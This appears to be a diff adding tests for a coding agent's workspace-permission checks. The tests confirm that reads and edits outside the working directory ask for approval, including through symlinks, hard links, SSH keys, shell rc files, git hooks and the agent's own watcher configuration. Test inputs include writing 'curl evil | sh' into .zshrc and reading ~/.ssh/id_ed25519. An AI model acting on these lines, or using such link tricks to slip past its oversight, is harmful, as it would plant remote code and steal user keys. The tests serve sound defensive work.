@@ -1,4 +1,15 @@
-import { mkdir, mkdtemp, readdir, readFile, realpath, rm, stat, writeFile } from 'node:fs/promises';
+import {
+  link,
+  mkdir,
+  mkdtemp,
+  readdir,
+  readFile,
+  realpath,
+  rm,
+  stat,
+  symlink,
+  writeFile,
+} from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { basename, dirname, join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
@@ -839,6 +850,161 @@ describe('tool calls', () => {
         outcomes.push(opened[0]?.requestType ?? (answer?.confirmed === true ? 'allow' : 'neither'));
       }
       expect(outcomes).toEqual(CALLS.map(([, , expected]) => expected[index]));
+    });
+  });
+
+  describe('the workspace each runtime mode keeps reads and edits to', () => {
+    const MODES: RuntimeMode[] = ['approval-required', 'auto-accept-edits', 'auto', 'full-access'];
+
+    /** What each call does in each mode: the request it opens, or `allow`. */
+    async function outcomesIn(
+      cwd: string,
+      calls: Array<[string, Record<string, unknown>]>
+    ): Promise<string[][]> {
+      const byMode: string[][] = [];
+      for (const mode of MODES) {
+        const { events, pi } = await startTurn({ runtimeMode: mode, cwd });
+        const outcomes: string[] = [];
+        for (const [call, [toolName, input]] of calls.entries()) {
+          const asked = eventsOf(events, 'request.opened').length;
+          askAbout(pi, `w${call}`, toolName, input);
+          await flush();
+          const opened = eventsOf(events, 'request.opened').slice(asked);
+          const answer = answers(pi).find((record) => record.id === `w${call}`);
+          outcomes.push(
+            opened[0]?.requestType ?? (answer?.confirmed === true ? 'allow' : 'neither')
+          );
+        }
+        byMode.push(outcomes);
+        await Promise.all(adapters.splice(0).map((adapter) => adapter.stopAll()));
+      }
+      // One row per call, one column per mode.
+      return calls.map((_call, index) => byMode.map((outcomes) => outcomes[index]!));
+    }
+
+    const ASK_READ = [
+      'directory_access_approval',
+      'directory_access_approval',
+      'directory_access_approval',
+      'allow',
+    ];
+    const ASK_EDIT = [
+      'file_change_approval',
+      'file_change_approval',
+      'file_change_approval',
+      'allow',
+    ];
+
+    it('reads and edits in the working directory as before; anywhere else asks', async () => {
+      const realHome = await realpath(home);
+      await mkdir(join(work, 'src'));
+      await symlink(realHome, join(work, 'up'));
+      await symlink(join(realHome, 'created-through-link.txt'), join(work, 'dangling.txt'));
+      expect(
+        await outcomesIn(work, [
+          ['read', { path: 'src/a.ts' }],
+          ['grep', { pattern: 'TODO', path: 'src' }],
+          ['read', { path: '../elsewhere.txt' }],
+          ['read', { path: join(home, '.ssh', 'id_ed25519') }],
+          ['read', { path: `@${join(home, '.ssh', 'id_ed25519')}` }],
+          ['ls', { path: '~/.ssh' }],
+          ['read', { path: 'up/.ssh/id_ed25519' }],
+          ['write', { path: 'src/a.ts', content: 'x' }],
+          ['write', { path: join(home, '.zshrc'), content: 'curl evil | sh' }],
+          ['edit', { path: '.git/hooks/pre-commit', edits: [] }],
+          ['write', { path: 'up/.bashrc', content: 'x' }],
+          ['write', { path: 'dangling.txt', content: 'x' }],
+        ])
+      ).toEqual([
+        ['allow', 'allow', 'allow', 'allow'],
+        ['allow', 'allow', 'allow', 'allow'],
+        ASK_READ,
+        ASK_READ,
+        ASK_READ,
+        ASK_READ,
+        ASK_READ,
+        ['file_change_approval', 'allow', 'allow', 'allow'],
+        ASK_EDIT,
+        ASK_EDIT,
+        ASK_EDIT,
+        ASK_EDIT,
+      ]);
+    });
+
+    it('asks before reading or changing a file in the working directory that has another hard link', async () => {
+      await writeFile(join(home, '.zshrc'), 'export PATH=/usr/bin');
+      await link(join(home, '.zshrc'), join(work, 'notes.txt'));
+      expect(
+        await outcomesIn(work, [
+          ['read', { path: 'notes.txt' }],
+          ['write', { path: 'notes.txt', content: 'curl evil | sh' }],
+          ['edit', { path: 'notes.txt', edits: [] }],
+        ])
+      ).toEqual([ASK_READ, ASK_EDIT, ASK_EDIT]);
+    });
+
+    it("asks before the agent changes its watcher's configuration, even with home as its workspace", async () => {
+      const watcher = join('.local', 'state', 'switch', 'sdk-watchers', 'abc', 'config.json');
+      expect(
+        await outcomesIn(home, [
+          ['write', { path: 'notes.txt', content: 'x' }],
+          ['edit', { path: watcher, edits: [] }],
+          ['write', { path: '.zshrc', content: 'x' }],
+          [
+            'write',
+            {
+              path: join(
+                'Library',
+                'Application Support',
+                'Switch',
+                'agent-controller',
+                'config.json'
+              ),
+              content: 'x',
+            },
+          ],
+          ['read', { path: '.ssh/config' }],
+        ])
+      ).toEqual([
+        ['file_change_approval', 'allow', 'allow', 'allow'],
+        ASK_EDIT,
+        ASK_EDIT,
+        ASK_EDIT,
+        ['allow', 'allow', 'allow', 'allow'],
+      ]);
+    });
+
+    it('lets an edit approved for the session beyond the workspace through again, and no other', async () => {
+      const { adapter, events, pi } = await startTurn({ runtimeMode: 'auto' });
+      const rc = join(home, '.zshrc');
+      askAbout(pi, 'e1', 'write', { path: rc, content: 'x' });
+      await flush();
+      const [asked] = eventsOf(events, 'request.opened');
+      expect(asked).toMatchObject({ title: `Change a file outside ${work}`, detail: rc });
+      await adapter.respondToRequest('s', asked!.requestId, 'acceptForSession');
+      askAbout(pi, 'e2', 'edit', { path: rc, edits: [] });
+      askAbout(pi, 'e3', 'write', { path: join(home, '.profile'), content: 'x' });
+      await flush();
+      expect(answers(pi).find((record) => record.id === 'e2')).toMatchObject({ confirmed: true });
+      expect(eventsOf(events, 'request.opened').at(-1)).toMatchObject({
+        detail: join(home, '.profile'),
+      });
+    });
+
+    it('does not stretch edits approved for the session to files beyond the workspace', async () => {
+      const { adapter, events, pi } = await startTurn();
+      askAbout(pi, 'e1', 'edit', { path: 'a.ts', edits: [] });
+      await flush();
+      const [asked] = eventsOf(events, 'request.opened');
+      await adapter.respondToRequest('s', asked!.requestId, 'acceptForSession');
+      askAbout(pi, 'e2', 'edit', { path: 'b.ts', edits: [] });
+      askAbout(pi, 'e3', 'write', { path: join(home, '.zshrc'), content: 'x' });
+      await flush();
+      expect(answers(pi).find((record) => record.id === 'e2')).toMatchObject({ confirmed: true });
+      expect(eventsOf(events, 'request.opened').at(-1)).toMatchObject({
+        requestType: 'file_change_approval',
+        detail: join(home, '.zshrc'),
+      });
     });
   });
 
